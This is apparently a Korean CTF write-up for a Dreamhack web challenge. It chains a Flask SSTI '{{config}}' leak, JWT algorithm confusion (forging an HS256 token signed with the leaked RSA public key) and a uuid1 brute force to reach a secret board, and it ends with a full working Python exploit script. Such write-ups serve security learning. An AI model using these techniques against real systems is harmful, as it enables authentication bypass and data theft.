## 코드

너무 많아서 생략

## 풀이

### Step 1 : SSTI 취약점 활용 정보 leak

semgrep 을 통해 ssti 취약점 있는 것 확인(그냥 render_template_string 검색해도 될듯)

ssti 취약점(render_template_string)을 활용해서 {{config}}를 leak
회원가입을 {{config}}로 하고 `해당 페이지는 존재하지 않습니다.` 를 유도하면 leak 할 수 있음

```json
{
   "ENV":"production",
   "DEBUG":false,
   "TESTING":false,
   "PROPAGATE_EXCEPTIONS":"None",
   "PRESERVE_CONTEXT_ON_EXCEPTION":"None",
   "SECRET_KEY":"b""\\xb1v\\xd7\\xa9\\xfb94\\x16\\x82TS\\xc9mgx\\xbeP\\xe9&quot;\\x8c\\x1d\\xf2\\xea\\xec]y\\x99\\x89\\x85\n\\xa5V",
   "PERMANENT_SESSION_LIFETIME":datetime.timedelta(days=31),
   "USE_X_SENDFILE":false,
   "SERVER_NAME":"None",
   "APPLICATION_ROOT":"/",
   "SESSION_COOKIE_NAME":"session",
   "SESSION_COOKIE_DOMAIN":false,
   "SESSION_COOKIE_PATH":"None",
   "SESSION_COOKIE_HTTPONLY":true,
   "SESSION_COOKIE_SECURE":false,
   "SESSION_COOKIE_SAMESITE":"None",
   "SESSION_REFRESH_EACH_REQUEST":true,
   "MAX_CONTENT_LENGTH":"None",
   "SEND_FILE_MAX_AGE_DEFAULT":"None",
   "TRAP_BAD_REQUEST_ERRORS":"None",
   "TRAP_HTTP_EXCEPTIONS":false,
   "EXPLAIN_TEMPLATE_LOADING":false,
   "PREFERRED_URL_SCHEME":"http",
   "JSON_AS_ASCII":true,
   "JSON_SORT_KEYS":true,
   "JSONIFY_PRETTYPRINT_REGULAR":false,
   "JSONIFY_MIMETYPE":"application/json",
   "TEMPLATES_AUTO_RELOAD":"None",
   "MAX_COOKIE_SIZE":4093,
   "AUTH_PUBLIC_KEY":"b""-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCHe8vs2e8yiY+maoGd7IxtsCUP\nQkAGJgYqAYllxeCXtrv1ZyXaG1ttsfTyWnk9cJ8NFbk9ahMvdGopnoiN6mCvquhy\nBAUdpBc5xVEOATh0Srb96btxJkBilTw9c0feV5D6I83382YrYglZAnKTsS6/L4+Q\ndikLqztu2il+PRQHOQIDAQAB\n-----END PUBLIC KEY-----",
   "FLAG_SCHOOL":"드림대학교",
   "SQLALCHEMY_DATABASE_URI":"sqlite:////app/database.db",
   "TIMEZONE":"Asia/Seoul"
}
```

### Step 2 : JWT 토큰 생성

이때 우리가 로그인한 JWT 토큰은 아래와 같이 쿠키에 token이라는 값으로 저장되어 있음

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2NDkzODU0OTAsImV4cCI6MTY0OTM4OTA5MCwidXNlcm5hbWUiOiJhc2RmIiwic2Nob29sIjoiYXNkZiJ9.WvgiDy3n2BaOW4MjCmDSi3zV0S6YnUylbEUZGoGFgv90XnR3gU9nONDXr1cpeVvXsYLEcWWqyknkw_iEVuUqULiY4jRvZk9KvVHPfahL4qJnu1_BkGcLe0xYgANBdngUDIlOrS3SuoFn6Pu_-kiDITLgBMaH_0RHJsggSAgCqWs
```

문제를 자세히 보진 않았지만, 드림대학교로 가입하면 드림대학교 게시판에 flag가 있을 것 같다.
근데 드림대학교 가입은 폼에서 막고 있으니, 이를 우회하기 위해 드림대학교 정보가 담긴 JWT 토큰을 만들어야겠다.
제시된 서버 코드에서 JWT 토큰 관련 코드는 다음과 같다. 

```python
# auth.py
class JwtAuthenticator:
    def generate(self, user: User) -> str:
        return (
            jwt.encode(
                {
                    "iat": datetime.datetime.utcnow(),
                    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1),
                    "username": user.username,
                    "school": user.school_name,
                },
                self.private_key,
                algorithm="RS256",
            )
        ).decode()

    def decode(self, token: str) -> tuple[str, str]:
        payload = jwt.decode(token, self.public_key, options={"verify_signature": True})
        return str(payload["username"]), str(payload["school"])
```

다른 서명 방식과 동일하게, private_key로 암호화한 토큰을 public_key로 검증하는 방식이다.
앞서 config에서 leak된 정보 중에서 AUTH_PUBLIC_KEY가 있다.
일반적으로 토큰을 만들기 위해 필요한건 AUTH_PRIVATE_KEY인데, 이걸 우째 우회하면 좋을까..

여기서 예술적인 포인트가 등장한다. generate()에서는 jwt.encode(..., algorithm="RS256")와 같이 암호 알고리즘을 지정해주는 반면, jwt.decode()에서는 알고리즘을 지정해주지 않는다는 것이다..!
이게 무슨 문제가 되냐면, jwt.encode(key=public_key, algorithm="대칭키알고리즘")으로 JWT 토큰을 생성하면
self.decode()를 할때 key에 public_key를 넣으면 그대로 디코딩이 되어 JWT 토큰으로 동작할 수 있게 된다. 정말 놀라운 방법이다. 나는 애초에 JWT에서 지원하는 암호 방식이 다양한지도 몰랐는데, 문제에서 제시된 RS256은 RSA+SHA256 방식의 비대칭키 알고리즘이고 다른 지원 방식 중에서 HS256은 대칭키 알고리즘이다.. 이러면 우리가 원하는 대칭키 알고리즘으로, 알고있는 서버의 공개키를 넣어 직접 만든 JWT 토큰을 서버에 전달하면 놀랍게도 서버는 이를 인식해서 동작한다는 것이다.

```python
token = jwt.encode(
    {
        "username": USERNAME,
        "school": SCHOOL,
        "iat": datetime.datetime.utcnow(),
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=10),
    },
    pubkey,
    algorithm="HS256",
).decode()
```

이런 방식으로 말이다. 여기에 추가적으로 요즘 버전의 JWT에서는 공개키를 활용한 decode를 제한하고 있다. 다음과 같은 방법으로..

```python
def prepare_key(self, key):
    key = force_bytes(key)

    invalid_strings = [
        b'-----BEGIN PUBLIC KEY-----',
        b'-----BEGIN CERTIFICATE-----',
        b'-----BEGIN RSA PUBLIC KEY-----',
        b'ssh-rsa'
    ]

    if any([string_value in key for string_value in invalid_strings]):
        raise InvalidKeyError(
            'The specified key is an asymmetric key or x509 certificate and'
            ' should not be used as an HMAC secret.')

    return key
```

근데 참 철두철미한 드림핵은 이것을 도커파일에서 패치해놨다.

```dockerfile
RUN sed -i.bak '143,146d' /usr/local/lib/python3.9/site-packages/jwt/algorithms.py
```

처음에는 이게 뭔가 했었는데 원본.bak을 저장하고 143~146번째 줄을 삭제하는 스크립트였다.
실제 스크립트를 돌릴 때에도 이 부분을 패치해주어야 한다. 나는 도커를 활용해서 처리했다.

### Step 3 : 비밀 게시글 ID 알아내기

사실 나는 여기까지에서 정신이 아득해졌는데, 비밀 게시판에 접근하려면 로그인을 한 번 더 해야한다. 대신 url을 통해 접근하는건 가능하기 때문에, 비밀 게시판의 uuid를 알아내면 접속할 수 있다.

이때 이전에 비밀 게시판과 자유 게시판의 uuid를 비교해본적 있는데, 정말 일부분만 다르고 나머지는 동일했다. 생성과정을 보니 uuid.uuid1() 으로 자유 게시판, 비밀 게시판 순서대로 만들게 되며, 이는 timestamp에만 의존하므로 둘은 timestamp의 차이만큼만 발생하는 것이다. 이 부분은 Brute-force로 알아낼 수 있다. 

### Step 4 : 전체 exploit

전체 exploit을 작성하여 도커 환경(algorithms.py 패치한 python 3.9 환경)에서 실행시켰고, 플래그를 얻을 수 있었다.

```python
import random
import string
import datetime

import requests
import jwt

s = requests.Session()
info = lambda x: print(f"[+] {x}")

URL = "http://host1.dreamhack.games:15967/"
USERNAME = "".join([random.choice(string.ascii_lowercase) for _ in range(10)])
PASSWORD = "".join([random.choice(string.ascii_lowercase) for _ in range(10)])
SCHOOL = "드림대학교"


info(f"USERNAME: {USERNAME}, PASSWORD: {PASSWORD}")


# 1. SSTI
# 1.1. Register with malicious school name, "{{config}}"
s.post(
    f"{URL}/register",
    data={
        "username": USERNAME,
        "password": PASSWORD,
        "password_confirm": PASSWORD,
        "school": "{{config}}",
    },
)

s.post(
    f"{URL}/login",
    data={
        "username": USERNAME,
        "password": PASSWORD,
    },
)

# 1.2. Access 404 page to trigger SSTI.
res = s.get(f"{URL}/none")

# 1.3. Get public key.
pubkey = (
    res.text.split("AUTH_PUBLIC_KEY&#39;: b&#39;")[1]
    .split("&#39;")[0]
    .replace("\\n", "\n")
)

info(f"Public Key:\n{pubkey}")

# 2. JWT
# 2.1. Encode JWT via HS256 with taken token.
# Note that encode token with public key is available at version 0.4.3 (PyJWT)
token = jwt.encode(
    {
        "username": USERNAME,
        "school": SCHOOL,
        "iat": datetime.datetime.utcnow(),
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=10),
    },
    pubkey,
    algorithm="HS256",
).decode()

s.cookies.set("token", token)
info(f"JWT: {token}")


# 3. UUID
# 3.1. Get UUID of free board.
res = s.get(f"{URL}/s/{SCHOOL}")
free_board_id = res.text.split(f'<a class="title" href="/s/{SCHOOL}/')[1].split(
    '">자유게시판</a>'
)[0]

info(f"FREE BOARD ID: {free_board_id}")


# 3.2. Brute force secret board's ID
def uuid(num: int) -> str:
    return f"{hex(int(free_board_id.split('-')[0], 16) + num)[2:]}-{'-'.join(free_board_id.split('-')[1:])}"


for counter in range(1, 600):
    res = s.get(f"{URL}/s/{SCHOOL}/{uuid(counter)}")
    info(f"({counter:4}) {uuid(counter)}, {res.status_code}")

    if res.status_code != 404:
        break

res = s.get(URL + res.text.split('<a class="post-list-elem" href="')[1].split('"')[0])
info(f"FLAG: " + res.text.split('<p class="content">')[1].split("</p>")[0])
```

### 그외 삽질

[https://domdom.tistory.com/entry/Research-Crack-Flask-Cookies-Secret-Key](https://domdom.tistory.com/entry/Research-Crack-Flask-Cookies-Secret-Key)

이거 보면서 SECRET_KEY에 꽂혔다가 삽질 오지게 했다. 왜 ascii decoding이 안되냐....